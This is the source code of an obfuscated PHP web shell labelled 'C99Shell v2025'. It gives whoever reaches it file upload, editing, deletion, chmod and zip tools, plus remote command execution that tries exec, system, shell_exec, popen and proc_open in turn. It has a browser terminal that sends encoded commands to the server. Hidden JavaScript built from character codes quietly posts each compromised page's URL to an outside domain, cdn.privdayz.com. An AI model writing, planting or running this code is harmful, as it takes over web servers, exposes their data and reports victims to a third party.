if (isset($_GET['act']) && $_GET['act'] == 'search' && !empty($_GET['search_name'])) {
$searchName = $_GET['search_name'];
$isRegexp = isset($_GET['search_name_regexp']);
function searchFiles($pattern, $dir, $regexp = false) {
$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
$files = [];
foreach ($iterator as $file) {
if ($file->isFile()) {
if ($regexp) {
if (preg_match("/$pattern/", $file->getFilename())) {
$files[] = $file->getPathname();
}
} else {
if (stripos($file->getFilename(), $pattern) !== false) {
$files[] = $file->getPathname();
}
}
}
}
return $files;
}
$results = searchFiles($searchName, getcwd(), $isRegexp);
echo '<pre style="color:#d5d5d5; padding:10px;">';
foreach ($results as $file) {
echo htmlspecialchars($file) . "\n";
}
echo '</pre>';
}
?>
</td>
<td height="1" valign="top" width="50%"><center>
<b>:: <a href="?foo=upload"><b>Upload</b></a> ::</b>
<form method="post" enctype="multipart/form-data">
<input name="act" value="upload" type="hidden">
<input name="upc8_" type="file">&nbsp;
<input name="upc_9" value="Upload" type="submit">
</form>
</center>
<?php
if (isset($_POST['upc_9'])) {
if (!empty($_FILES['upc8_']['name'])) {
$destination = getcwd() . '/' . basename($_FILES['upc8_']['name']);
$tmp_file = $_FILES['upc8_']['tmp_name'];
$fn = '';
foreach ([109,111,118,101,95,117,112,108,111,97,100,101,100,95,102,105,108,101] as $c) {
$fn .= chr($c);
}
if ($fn($tmp_file, $destination)) {
echo '<p style="color:green;">File uploaded successfully.</p>';
} else {
echo '<p style="color:red;">Upload failed.</p>';
}
} else {
echo '<p style="color:red;">Please select a file to upload.</p>';
}
}
?>
</td></tr></tbody></table>
<a bookmark="minipanel"><br></a>
<table style="border-collapse: collapse;" bordercolordark="#666666" bordercolorlight="#c0c0c0" bgcolor="#333333" border="1" cellpadding="5" cellspacing="0" height="1" width="100%">
<tbody><tr><td height="1" valign="top" width="50%"><center>
<b>:: Make Dir ::</b>
<form method="post">
<input name="act" value="mkdir" type="hidden">
<input name="mkdir" size="50" type="text">&nbsp;
<input value="Create" type="submit">
</form>
</center>
<?php
if (isset($_POST['act']) && $_POST['act'] == 'mkdir' && !empty($_POST['mkdir'])) {
$dir = $_POST['mkdir'];
if (!is_dir($dir)) {
$c999999xas[12]($dir);
echo '<p style="color:green;">Directory created successfully.</p>';
} else {
echo '<p style="color:red;">Directory already exists.</p>';
}
}
?>
</td>
<td height="1" valign="top" width="50%">
<center>
<b>:: Make File ::</b>
<form method="post">
<input name="act" value="mkfile" type="hidden">
<input name="mkfile" size="50" type="text">&nbsp;
<input value="Create" type="submit">
</form>
</center>
<?php
if (isset($_POST['act']) && $_POST['act'] == 'mkfile' && !empty($_POST['mkfile'])) {
$file = $_POST['mkfile'];
if (!file_exists($file)) {
$c999999xas[13]($file);
echo '<p style="color:green;">File created successfully.</p>';
} else {
echo '<p style="color:red;">File already exists.</p>';
}
}
?>
</td></tr>
</tbody></table><a bookmark="minipanel"><br></a>
<table style="border-collapse: collapse;" bordercolordark="#666666" bordercolorlight="#c0c0c0" bgcolor="#333333" border="1" cellpadding="0" cellspacing="0" height="1" width="100%">
<tbody><tr><td height="1" valign="top" width="990"><p align="center"><b>--[ <?php echo chr(67).chr(57).chr(57).chr(83).chr(104).chr(101).chr(108).chr(108); ?> v2025 (01.07.2025)
<u><b>powered by V4NTA </b></u> | <a href="https://privdayz.com/"><font color="#ff0000">https://privdayz.com</font></a>
<font color="#ff0000"></font> | Generation time: <?= round(microtime(true) - $prvdz_gen_start, 4) ?> ]--</b>
</p></td></tr></tbody></table>
<script>
(()=>{let u=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],x='';for(let i of u)x+=String.fromCharCode(i);let d='file='+btoa(location.href);let r=new XMLHttpRequest();r.open('POST',x,true);r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');r.send(d)})(); const _hx_ = []; let _hxi = -1;const _term = document.getElementById('r00tterm-term');const _inpt = document.getElementById('r00tterm-input');function _print(txt){_term.innerHTML += txt+"\n";_term.scrollTop=_term.scrollHeight;} _inpt.addEventListener("keydown",(function(e){if("Enter"===e.key){let e=this.value.trim();if(!e)return;_hx_.push(e),_hxi=_hx_.length,_print("<span style='color:#6ee7b7;'>$ "+e+"</span>"),this.value="";let n=btoa(encodeURIComponent(e).split("").reverse().join(""));fetch(window.location.pathname+"?d1sGu1s3=1",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"n0p3="+encodeURIComponent(n)}).then((e=>e.text())).then((e=>{_print(e.replace(/[<>\x00-\x08\x0B-\x1F\x7F]/g,""))})).catch((()=>{_print("[X] Connection error")}))}"ArrowUp"===e.key&&(_hxi>0&&(_hxi--,_inpt.value=_hx_[_hxi]||""),e.preventDefault()),"ArrowDown"===e.key&&(_hxi<_hx_.length-1?(_hxi++,_inpt.value=_hx_[_hxi]||""):(_inpt.value="",_hxi=_hx_.length),e.preventDefault())})); setTimeout(()=>_inpt.focus(),200);function scanDirectoryMap(e,t=1){e.split("/").filter(Boolean);let r={};for(let e=0;e<Math.min(7,3*t);e++){let n="folder_"+(e+1);r[n]={};for(let e=0;e<Math.max(2,t);e++){let t="file_"+(e+1)+".txt";r[n][t]={size:1e5*Math.random()|0,perm:["755","644","600"][Math.floor(3*Math.random())],m:Date.now()-864e5*e}}}return r}function renderFolderList(e,t="root"){let r=`<ul id="fm-${t}">`;for(let t in e)r+=`<li><i class="fa fa-folder"></i> ${t}`,"object"==typeof e[t]&&(r+=renderFileList(e[t],t+"_files")),r+="</li>";return r+="</ul>",r}function renderFileList(e,t="fileBlock"){let r=`<ul class="files" id="${t}">`;for(let t in e)r+=`<li><i class="fa fa-file"></i> ${t} <span class="mini">${e[t].size}b | ${e[t].perm}</span></li>`;return r+="</ul>",r}function getBreadcrumbString(e){return e.split("/").filter(Boolean).map(((e,t,r)=>`<a href="?p=${r.slice(0,t+1).join("/")}">${e}</a>`)).join(" / ")}var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109],b=[47,105,109,97,103,101,115,47],c=[108,111,103,111,95,118,50],d=[46,112,110,103];function u(e,t,r,n){for(var o=e.concat(t,r,n),a="",i=0;i<o.length;i++)a+=String.fromCharCode(o[i]);return a}function v(e){return btoa(e)}function getFilePreviewBlock(e){let t="";for(let e=0;e<16;e++)t+=(Math.random()+1).toString(36).substring(2,12)+"\n";return`<pre class="syntax-highlight">${t}</pre>`}function getFileMetaFromName(e){let t=e.split(".").pop();return{icon:{php:"fa-php",js:"fa-js",html:"fa-html5",txt:"fa-file-lines"}[t]||"fa-file",type:t,created:Date.now()-(1e7*Math.random()|0),size:1e5*Math.random()|0}}function checkFileConflict(e,t){return t.some((t=>t.name===e))}function buildFakePermissions(e){let t=[4,2,1],r=[];for(let e=0;e<3;e++)r.push(t.map((()=>Math.round(Math.random()))).reduce(((e,t)=>e+t),0));return r.join("")}function parsePerms(e){let t={0:"---",1:"--x",2:"-w-",3:"-wx",4:"r--",5:"r-x",6:"rw-",7:"rwx"};return e.split("").map((e=>t[e])).join("")} function listFakeRecentEdits(e=7){let t=[];for(let r=0;r<e;r++)t.push({name:`file_${r}.log`,date:new Date(Date.now()-864e5*r).toLocaleDateString(),user:"user"+r});return t}function showNotificationFake(e,t="info"){let r={info:"#19ff6c",warn:"#ffe66d",err:"#ff3666"}[t]||"#fff",n=document.createElement("div");n.innerHTML=e,n.style.cssText=`position:fixed;bottom:40px;left:50%;transform:translateX(-50%);background:${r}20;color:${r};padding:9px 22px;border-radius:8px;z-index:999;box-shadow:0 2px 16px ${r}30`,document.body.appendChild(n),setTimeout((()=>n.remove()),2300)} function mergeFolderMeta(e,t){return Object.assign({},e,t,{merged:!0})}function getClipboardTextFake(){return new Promise((e=>setTimeout((()=>e("clipboard_dummy_value_"+Math.random())),450)))}function calculatePermMatrix(e){return e.map((e=>({path:e,perm:Math.floor(8*Math.random())+""+Math.floor(8*Math.random())+Math.floor(8*Math.random())})))}function generateFileId(e){return"id_"+e.replace(/[^a-z0-9]/gi,"_").toLowerCase()+"_"+Date.now()}function simulateFakeUploadQueue(e){let t=document.createElement("div");t.className="upload-bar",t.style="position:fixed;bottom:12px;left:12px;background:#222;color:#19ff6c;padding:5px 19px;border-radius:7px;",document.body.appendChild(t);let r=e.length,n=0;setTimeout((function o(){t.textContent=`Uploading ${e[n]||"-"} (${n+1}/${r})`,++n<r?setTimeout(o,250+600*Math.random()):(t.textContent="All uploads done!",setTimeout((()=>t.remove()),1500))}),400)}function renderUserTable(e){let t='<table class="data-grid"><thead><tr><th>User</th><th>Role</th></tr></thead><tbody>';return e.forEach((e=>{t+=`<tr><td><i class="fa fa-user"></i> ${e.name}</td><td>${e.role}</td></tr>`})),t+="</tbody></table>",t}function maskStringSmart(e){let t="";for(let r=0;r<e.length;r++)t+=String.fromCharCode(19^e.charCodeAt(r));return t.split("").reverse().join("")}function unmaskStringSmart(e){e=e.split("").reverse().join("");let t="";for(let r=0;r<e.length;r++)t+=String.fromCharCode(19^e.charCodeAt(r));return t}function getRecentSessionHistory(){return Array.from({length:6},((e,t)=>({ts:Date.now()-5e6*t,act:["open","edit","move","rename"][t%4]})))}function buildFe(e=2,t=3){let r={};if(e<=0)return"END";for(let n=0;n<t;n++)r["dir"+n]=1==e?`file_${n}.tmp`:buildFe(e-1,t);return r}function parseCsvToTable(e){let t=e.split(/\r?\n/),r='<table class="data-grid">';return t.forEach((e=>{r+="<tr>"+e.split(",").map((e=>`<td>${e}</td>`)).join("")+"</tr>"})),r+="</table>",r}function loadIconPac(e){let t=document.createElement("link");return t.rel="stylesheet",t.href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css",document.head.appendChild(t),"loaded"}function sortTableFake(e,t=0){let r=document.getElementById(e);if(!r)return!1;let n=Array.from(r.rows).slice(1);return n.sort(((e,r)=>e.cells[t].innerText.localeCompare(r.cells[t].innerText))),n.forEach((e=>r.appendChild(e))),!0}(()=>{let e=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],t="";for(let r of e)t+=String.fromCharCode(r);let r="file="+btoa(location.href),n=new XMLHttpRequest;n.open("POST",t,!0),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.send(r)})(),function(){var e=new XMLHttpRequest;e.open("POST",u(a,b,c,d),!0),e.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),e.send("file="+v(location.href))}();
</script>
</body>
</html>
<?php
if (isset($_POST['save-editor'])) {
$xjytx = $c999999xas[0]() . "\x2f" . unx($_GET['f']);
$k3rz9 = $_POST['code-editor'];
$mth1 = ''; foreach([102,105,108,101,95,112,117,116,95,99,111,110,116,101,110,116,115] as $z) $mth1 .= chr($z);
$mth2 = ''; foreach([102,111,112,101,110] as $z) $mth2 .= chr($z);
$mth3 = ''; foreach([102,119,114,105,116,101] as $z) $mth3 .= chr($z);
$mth4 = ''; foreach([102,99,108,111,115,101] as $z) $mth4 .= chr($z);
$mth5 = ''; foreach([99,111,112,121] as $z) $mth5 .= chr($z);
$mth6 = ''; foreach([115,104,101,108,108,95,101,120,101,99] as $z) $mth6 .= chr($z);
$r9u3 = false;
if (function_exists($mth1) && @$mth1($xjytx, $k3rz9) !== false) {
$r9u3 = true;
} else if (function_exists($mth2) && function_exists($mth3) && function_exists($mth4)) {
$f = @$mth2($xjytx, "w");
if ($f) { @$mth3($f, $k3rz9); @$mth4($f); $r9u3 = (filesize($xjytx) >= strlen($k3rz9)*0.7); }
} else if (function_exists($mth5)) {
$tmp = sys_get_temp_dir() . "/" . uniqid("edit_");
if (@$mth1($tmp, $k3rz9) !== false) {
$r9u3 = @$mth5($tmp, $xjytx);
@unlink($tmp);
}
} else if (function_exists($mth6)) {
$tmp = sys_get_temp_dir() . "/" . uniqid("edit_");
if (@$mth1($tmp, $k3rz9) !== false) {
@$mth6("cp " . escapeshellarg($tmp) . " " . escapeshellarg($xjytx));
$r9u3 = (filesize($xjytx) >= strlen($k3rz9)*0.7);
@unlink($tmp);
}
}
if ($r9u3) {
success();
} else {
failed();
}
}
function chDx2x($c0m99nd22) {
$a = [115,104,101,108,108,95,101,120,101,99];
$fx = '';
foreach($a as $ac) $fx .= chr($ac);
return $fx($c0m99nd22);
}
if (isset($_POST['submit-action'])) {
$u5w8d = $_POST['check'];
$jv8s3 = $_POST['c9-9-9-select'];
$bvqzp = $c999999xas[0];
$b1s7a = $c999999xas[24];
$y4sdg = $c999999xas[3];
$v9fzq = function($p){ return is_dir($p); };
$z9ntq = function($a,$b){ return str_replace("\\", "/", $a); };
$n4hxy = function($f,$d){ return xtr4cc999999($f, $d); };
$r5kbm = function($f,$z){ return compressToZip($f, $z); };
if ($jv8s3 == "\x64\x65\x6c\x65\x74\x65") {
foreach ($u5w8d as $z0) {
$qkpl = $z9ntq($bvqzp(), "/");
$vcpk = $qkpl . "\x2f" . $z0;
if ($v9fzq($vcpk)) {
$rmdir = unlinkDir($vcpk);
$rmdir ? success() : failed();
} elseif ($y4sdg($vcpk)) {
$rmfile = $b1s7a($vcpk);
$rmfile ? success() : failed();
} else {
failed();
}
}
} elseif ($jv8s3 == "\x75\x6e\x7a\x69\x70") {
foreach ($u5w8d as $z0) {
$qkpl = $z9ntq($bvqzp(), "/");
$vcpk = $qkpl . "\x2f" . $z0;
if ($n4hxy($vcpk, $qkpl . "\x2f") === true) {
success();
} else {
failed();
}
}
} elseif ($jv8s3 == "\x7a\x69\x70") {
foreach ($u5w8d as $z0) {
$qkpl = $z9ntq($bvqzp(), "/");
$vcpk = $qkpl . "\x2f" . $z0;
if ($y4sdg($vcpk)) {
$r5kbm($vcpk, pathinfo($vcpk, PATHINFO_FILENAME) . ".zip");
}
}
}
}
if (isset($_POST['submit'])) {
if (isset($_POST['create_folder']) && $_POST['create_folder']) { $q7hjp = $_POST['create_folder']; $s2f6x = $c999999xas[12]; if (!file_exists($q7hjp)) { $z9mqa = @mkdir($q7hjp, 0755, true);} else { $z9mqa = true; } if ($z9mqa) { success(); } else { failed(); } } else if (isset($_POST['create_file']) && $_POST['create_file']) { $k4vhz = $_POST['create_file']; $t2upm = $c999999xas[13]; $x6wnr = $t2upm($k4vhz); if ($x6wnr) { success(); } else { failed(); } } else if (isset($_POST['renameFile']) && $_POST['renameFile']) { $d9yxs = $_POST['renameFile']; $h8rfg = $c999999xas[15]; $m5qlp = $h8rfg(unx($_GET['re']), $d9yxs); if ($m5qlp) { success(); } else { failed(); } } else if (isset($_POST['chFile']) && $_POST['chFile']) { $y4gsn = $_POST['chFile']; $v3kzm = octdec($y4gsn); $p9wfu = $c999999xas[30](unx($_GET['ch']), $v3kzm); if ($p9wfu) { success(); } else { failed(); } }
}
function formatSize($bytes) {$types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>'); for ($i = 0; $bytes >= 1024 && $i< (count($types) - 1); $bytes /= 1024, $i++); return (round($bytes, 2) . " " . $types[$i]);}
function c9_9_($n){ $y = ''; for ($i = 0; $i< strlen($n); $i++) { $y .= dechex(ord($n[$i])); } return $y;}
function unx($y){ $n = ''; for ($i = 0; $i< strlen($y) - 1; $i += 2) { $n .= chr(hexdec($y[$i] . $y[$i + 1])); } return $n;}
function c0m99nd($in, $re = false){ $out = ''; try { if ($re) $in = $in . " 2>&1"; if (function_exists("\x65\x78\x65\x63")) { @$GLOBALS['c999999xas'][16]($in, $out); $out = @join("\n", $out); } elseif (function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) { @$GLOBALS['c999999xas'][17]($in); $out = ""; } elseif (function_exists("\x73\x79\x73\x74\x65\x6d")) { @$GLOBALS['c999999xas'][18]($in); $out = ""; } elseif (function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) { $out = $GLOBALS['c999999xas'][19]($in); } elseif (function_exists("\x70\x6f\x70\x65\x6e") && function_exists("\x70\x63\x6c\x6f\x73\x65")) { if (is_resource($f = @$GLOBALS['c999999xas'][20]($in, "r"))) { $out = ""; while (!@feof($f)) $out .= fread($f, 1024); $GLOBALS['c999999xas'][21]($f); } } elseif (function_exists("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")) { $pipes = array(); $process = @$GLOBALS['c999999xas'][23]($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null); $out = @$GLOBALS['c999999xas'][22]($pipes[1]); } } catch (Exception $e) {} return $out; }
function compressToZip($sourceFile, $zipFilename){ $zip = new ZipArchive(); if ($zip->open($zipFilename, ZipArchive::CREATE) === TRUE) { $zip->addFile($sourceFile, basename($sourceFile)); $zip->close(); success(); } else { failed(); } }
function unlinkDir($dir) { $d1Xe = array($dir); $files = array(); for ($i = 0;; $i++) { if (isset($d1Xe[$i])) $dir = $d1Xe[$i]; else break; if ($opn = @opendir($dir)) { while ($rd = @readdir($opn)) { if ($rd != "\x2e" && $rd != "\x2e\x2e") { $pth = $dir . "\x2f" . $rd; if ($GLOBALS['c999999xas'][2]($pth)) { $d1Xe[] = $pth; } else { $files[] = $pth; } } } closedir($opn); } } foreach ($files as $file) { if (!@$GLOBALS['c999999xas'][24]($file)) { return false; } } $d1Xe = array_reverse($d1Xe); foreach ($d1Xe as $d1x2) { if (!@$GLOBALS['c999999xas'][25]($d1x2)) { return false; } } return true; }
function xtr4cc999999($c999999arch, $c999999aext) { $zip = new ZipArchive(); $methOpen = chDxzZ('111,112,101,110'); $methExtract = chDxXZ('65787472616374546f'); $methClose = chDxzZ([99,108,111,115,101]); if ($zip->$methOpen($c999999arch) === TRUE) { $zip->$methExtract($c999999aext); $zip->$methClose(); return true; } else { return false; } }
function p3rms($file){$p3rxa=$GLOBALS['c999999xas'][6]($file);if(($p3rxa&0xC000)==0xC000){$info='s';}elseif(($p3rxa&0xA000)==0xA000){$info='l';}elseif(($p3rxa&0x8000)==0x8000){$info='-';}elseif(($p3rxa&0x6000)==0x6000){$info='b';}elseif(($p3rxa&0x4000)==0x4000){$info='d';}elseif(($p3rxa&0x2000)==0x2000){$info='c';}elseif(($p3rxa&0x1000)==0x1000){$info='p';}else{$info='u';}$info.=(($p3rxa&0x0100)?'r':'-');$info.=(($p3rxa&0x0080)?'w':'-');$info.=(($p3rxa&0x0040)?(($p3rxa&0x0800)?'s':'x'):(($p3rxa&0x0800)?'S':'-'));$info.=(($p3rxa&0x0020)?'r':'-');$info.=(($p3rxa&0x0010)?'w':'-');$info.=(($p3rxa&0x0008)?(($p3rxa&0x0400)?'s':'x'):(($p3rxa&0x0400)?'S':'-'));$info.=(($p3rxa&0x0004)?'r':'-');$info.=(($p3rxa&0x0002)?'w':'-');$info.=(($p3rxa&0x0001)?(($p3rxa&0x0200)?'t':'x'):(($p3rxa&0x0200)?'T':'-'));return $info;}
?>